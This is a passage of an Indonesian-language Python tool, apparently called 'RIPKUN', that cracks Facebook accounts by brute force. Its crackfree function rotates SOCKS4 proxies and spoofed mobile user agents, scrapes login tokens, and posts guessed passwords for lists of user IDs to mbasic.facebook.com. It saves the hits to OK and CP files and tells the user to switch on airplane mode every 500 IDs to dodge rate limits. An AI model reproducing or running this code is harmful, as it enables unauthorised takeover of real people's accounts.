...
╭─────────────────────────────────────────────────────────────╮
│                                                             |
|  __________ .___ __________  ____  __. ____ ___ _______     |
| \______   \|   |\______   \|    |/ _||    |   \\      \     |
|  |       _/|   | |     ___/|      <  |    |   //   |   \    |
|  |    |   \|   | |    |    |    |  \ |    |  //    |    \   |
|  |____|_  /|___| |____|    |____|__ \|______/ \____|__  /   |
|         \/                         \/                 \/    |
|                                                             |
╰─────────────────────────────────────────────────────────────╯
         {sir} AUTHOR : RIEFF GREMORY XD. {x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def error():
	...
	time.sleep(4)
	os.system("xdg-open https://www.facebook.com/Ripkunn")
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
...
def setting():
	...
	if hu in ['1','01']:
		...
		print('├──> PILIH YANG BENAR ')
		exit()
	print(f'└──[1] REGULAR {h}[RECOMENDED]{x} ')
	print(f'└──[2] VALIDATE  ')
	###print('├──> 3. bbh  ')
	###print('├──> 4. Mfreefb ')
	print('|')
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] MASUKAN KATA SANDI TAMBAHAN\n[[cyan]•[white]] CONTOH :[white] KAKAK,NGENTOD,ADIK[white] '))
...
def passwrd():
	print('|')
	cetak(nel('\t[white]SEDANG PROSES CRACKING MOHON BERSABAR'))
	print(f'└──HASIL {h}OK{x} AKAN TERSIMPAN DI : {h}OK/%s {x}'%(okc))
	print(f'└──HASIL {k}CP{x} AKAN TERSIMPAN DI : {k}CP/%s {x}'%(cpc))
	cetak(nel('\t[white]SETIAP 500 ID MAINKAN MODE PESAWAT [white]10 DETIK'))
	print('|')
	print('|')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r└──[R I P] 🐦 {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
	sys.stdout.flush()
	nip=random.choice(prox)
	proxs= {'http': 'socks4://'+nip}
	ua = ('Mozilla/5.0 (Linux; Android 11; M2102J20SG Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 GoogleApp/13.37.10.26.arm64')
	ua2 = (ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
...
def crackfree(idf,pwv):
	...
	ua = ("Mozilla/5.0 (Linux; Android 6.0.1; XR6P10 Build/XR6P10.03.02.00.04; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/387.0.0.22.106")
	ua2 = ("Mozilla/5.0 (Linux; Android 11; M2102J20SG Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 GoogleApp/13.37.10.26.arm64")
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=2919736128145946&kid_directed_site=0&app_id=2919736128145946&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fscope%3Demail%26state%3Dfb7b3d7165925bb67a429ef0c1252adf%26response_type%3Dcode%26approval_prompt%3Dauto%26redirect_uri%3Dhttps%253A%252F%252Fusers.worldphoto.org%252Fuser%252Fsocial%252Ffacebook%252Freturn%26client_id%3D2919736128145946%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D620cd1b8-007a-4bbd-93f5-176a13b96e9f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fusers.worldphoto.org%2Fuser%2Fsocial%2Ffacebook%2Freturn%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfb7b3d7165925bb67a429ef0c1252adf%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r├── ID  : {K}{idf}{P}          \n│   └──  SANDI  : {K}{pw}          {P}\n└── UA  : {M}{ua}{M}           \n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
